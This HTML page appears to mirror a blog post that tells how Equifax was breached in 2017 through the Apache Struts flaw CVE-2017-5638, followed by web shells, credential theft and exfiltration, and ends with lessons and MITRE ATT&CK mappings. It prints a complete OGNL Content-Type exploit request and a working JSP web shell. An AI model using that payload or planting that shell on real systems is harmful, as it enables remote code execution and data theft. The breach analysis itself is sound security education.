<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/">Original</a>
    <h1>How Equifax Was Breached in 2017</h1>
    
    <div id="readability-page-1" class="page"><div><p>On a Saturday night, a security engineer at Equifax was updating an SSL certificate on a Network Intrusion Detection System (NIDS). Immediately after, suspicious connections were detected. After a more in-depth investigation, it became evident that the situation was far graver than anticipated. A service had to be promptly shut down to prevent further exploitation, but by that point, the damage was already done. Malicious actors had been exfiltrating data for several months and had already collected personal information from 163 million customers.</p><h2 id="how-it-happened"><span>How It Happened</span><a href="#how-it-happened"><i></i></a></h2><h3 id="initial-access"><span>Initial Access</span><a href="#initial-access"><i></i></a></h3><p>The story begins in March 2017 with the disclosure of a vulnerability in the Apache Struts software, tracked as <a href="https://nvd.nist.gov/vuln/detail/cve-2017-5638">CVE-2017-5638</a>. This security flaw allowed threat actors to achieve remote code execution on a server by crafting a specific <code>Content-Type</code> HTTP header. This vulnerability was ranked highly critical for its high impact potential and the ease with which it could be exploited.</p><p>Here an example running the <code>whoami</code> command on a vulnerable server as detailed in this <a href="https://github.com/rapid7/metasploit-framework/blob/1378bfbfc71e5c5a86678b80a29d84190b87185a/modules/exploits/multi/http/struts2_content_type_ognl.rb">exploit</a>.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td><pre><span>GET</span> <span>/struts2-showcase/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>127.0.0.1</span>
<span>Content-Type</span><span>:</span> <span>%{</span>
<span>    (#_=&#39;multipart/form-data&#39;).</span>
<span>    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span>
<span>    (#_memberAccess?</span>
<span>    (#_memberAccess=#dm):</span>
<span>    ((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).</span>
<span>    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span>
<span>    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</span>
<span>    (#context.setMemberAccess(#dm)))).</span>
<span>    (#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader(&#39;X-kKph&#39;)).</span>
<span>    (#os=@java.lang.System@getProperty(&#39;os.name&#39;)).</span>
<span>    (#cmds=(#os.toLowerCase().contains(&#39;win&#39;)?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/sh&#39;,&#39;-c&#39;,#cmd})).</span>
<span>    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</span>
<span>  }</span>
<span>X-kKph</span><span>:</span> <span>whoami</span>
</pre></td></tr></tbody></table></code></p></div><p>Equifax responded by committing to patch all affected applications within 48 hours. They also implemented a detection rule within <a href="https://www.snort.org/">Snort</a>, their Network Intrusion Detection System (NIDS) and conducted a filesystem scan to identify all systems with a vulnerable version of Apache Struts.</p><p>However, one application fell through the cracks, the Automated Consumer Interview System (ACIS). It was a legacy application built in the 1970s that customers used to dispute incorrect credit information. In May 2017, attackers discovered that ACIS was still vulnerable, allowing them to take control of a web server.</p><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/ACIS.png" alt="The Automated Consumer Interview System (ACIS)" data-proofer-ignore=""/></a> <em>The Automated Consumer Interview System (ACIS)</em></p><h3 id="persistence"><span>Persistence</span><a href="#persistence"><i></i></a></h3><p>Shortly after gaining initial access on ACIS, the attackers dropped Web Shells to maintain their foothold on systems. These Web Shells provided a means for the attackers to interact with the system without the need to repeatedly exploit the Apache Struts vulnerability.</p><p>Here’s an example of a basic Web Shell, allowing anyone to execute arbitrary commands by passing them as the “cmd” parameter in HTTP requests.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>&lt;%@ page </span><span>import=</span><span>&#34;java.io.*&#34;</span> <span>%&gt;</span>
<span>&lt;%</span>
    <span>String</span> <span>cmd</span> <span>=</span> <span>request</span><span>.</span><span>getParameter</span><span>(</span><span>&#34;cmd&#34;</span><span>);</span>
    <span>if</span> <span>(</span><span>cmd</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>Process</span> <span>p</span> <span>=</span> <span>Runtime</span><span>.</span><span>getRuntime</span><span>().</span><span>exec</span><span>(</span><span>cmd</span><span>);</span>
        <span>DataInputStream</span> <span>inputstream</span> <span>=</span> <span>new</span> <span>DataInputStream</span><span>(</span><span>p</span><span>.</span><span>getInputStream</span><span>());</span>
        <span>String</span> <span>line</span><span>;</span>
        <span>while</span> <span>((</span><span>line</span> <span>=</span> <span>inputstream</span><span>.</span><span>readLine</span><span>())</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            <span>out</span><span>.</span><span>println</span><span>(</span><span>line</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>%&gt;</span>
</pre></td></tr></tbody></table></code></p></div><h3 id="credential-access"><span>Credential Access</span><a href="#credential-access"><i></i></a></h3><p>ACIS, like any other application, relied on a database, but it didn’t store a significant amount of personal information because it was only used by a small number of clients at Equifax. The attackers continued their search and eventually discovered a mounted NFS share on the web server. This file share contained notes and configuration files used by Equifax engineers, in which they found many database credentials.</p><h3 id="lateral-movement--collection"><span>Lateral Movement &amp; Collection</span><a href="#lateral-movement--collection"><i></i></a></h3><p>There was no segmentation between the legacy system and the rest of Equifax’s infrastructure, making it possible for the attackers to access databases from other Equifax systems. With the credentials found on the file share, they were able to connect and execute queries on 48 different databases. They quickly found a table containing personal identifiable information (PII) and began collecting the data.</p><h3 id="exfiltration"><span>Exfiltration</span><a href="#exfiltration"><i></i></a></h3><p>The customer’s data was divided into multiple compressed files of 10 MB each and placed on the web servers in a publicly accessible directory. Gradually, the attackers exfiltrated the data by making HTTP requests with <code>wget</code> from multiple locations to retrieve the contents of these files. This approach was used to minimize the chances of triggering an alert.</p><h2 id="how-it-was-detected"><span>How It Was Detected</span><a href="#how-it-was-detected"><i></i></a></h2><p>During the month of July 2017, 76 days after the start of the attack, Equifax realized that their Network Intrusion Detection System (NIDS) had an expired SSL certificate, preventing them from decrypting and monitoring traffic for the ACIS environment. Immediately after uploading the SSL certificate, the security engineers received multiple alerts regarding suspicious requests coming from IP addresses in China.</p><p>Equifax initiated a thorough investigation, revealing that the filesystem scan, intended to identify systems with a vulnerable version of Apache Struts, had been executed in the incorrect directory within the ACIS environment, leaving those systems unknowingly vulnerable since March 2017. Simultaneously, several web shells were discovered on these servers, and finally they discovered that data being exfiltrated by attackers contained personal identifiable information (PII).</p><p>Following these discoveries, ACIS was promptly shut down as an emergency action to halt the cyberattack.</p><p>During the month of August 2017, Equifax engaged the firm Mandiant to conduct a forensic investigation. By retracing all the steps of the attackers, they discovered that the attackers had successfully exfiltrated data from 163 million customers before being stopped by the shutdown of the ACIS system.</p><h2 id="conclusion"><span>Conclusion</span><a href="#conclusion"><i></i></a></h2><p>The Equifax data breach from 2017 stands out as one of the largest data breaches in history, impacting millions of individuals. It is the result of several mistakes made by Equifax:</p><ul><li>Insufficient knowledge of their legacy systems.</li><li>Poor password storage practices.</li><li>Lack of rigor in the patching process.</li><li>Lack of network segmentation.</li><li>Lack of Host-Based Intrusion Detection System (HIDS)</li><li>Lack of alerting when security tools fail.</li></ul><p>By learning from these errors, organizations can better protect sensitive data and prevent similar incidents in the future.</p><h3 id="sources"><span>Sources</span><a href="#sources"><i></i></a></h3><ul><li><a href="https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf">The Equifax Data Breach | Oversight and Government Reform</a></li><li><a href="https://www.hsgac.senate.gov/wp-content/uploads/imo/media/doc/FINAL%20Equifax%20Report.pdf">How Equifax Neglected Cybersecurity and Suffered a Devastating Data Breach | United States Senate</a></li></ul><h3 id="techniques"><span>Techniques</span><a href="#techniques"><i></i></a></h3><p>The <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> techniques used by the attackers throughout the data breach:</p><ul><li>Initial Access<ul><li><a href="https://attack.mitre.org/techniques/T1190/">T1190 | Exploit Public-Facing Application</a></li></ul></li><li>Persistence<ul><li><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003 | Server Software Component: Web Shell</a></li></ul></li><li>Credential Access<ul><li><a href="https://attack.mitre.org/techniques/T1552/001/">T1552.001 | Unsecured Credentials: Credentials In Files</a></li></ul></li><li>Collection<ul><li><a href="https://attack.mitre.org/techniques/T1039/">T1039 | Data from Network Shared Drive</a></li><li><a href="https://attack.mitre.org/techniques/T1560/">T1560 | Archive Collected Data</a></li></ul></li><li>Exfiltration<ul><li><a href="https://attack.mitre.org/techniques/T1030/">T1030 | Data Transfer Size Limits</a></li></ul></li></ul><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/pixel.png" alt="p" data-proofer-ignore=""/></a></p></div></div>
  </body>
</html>
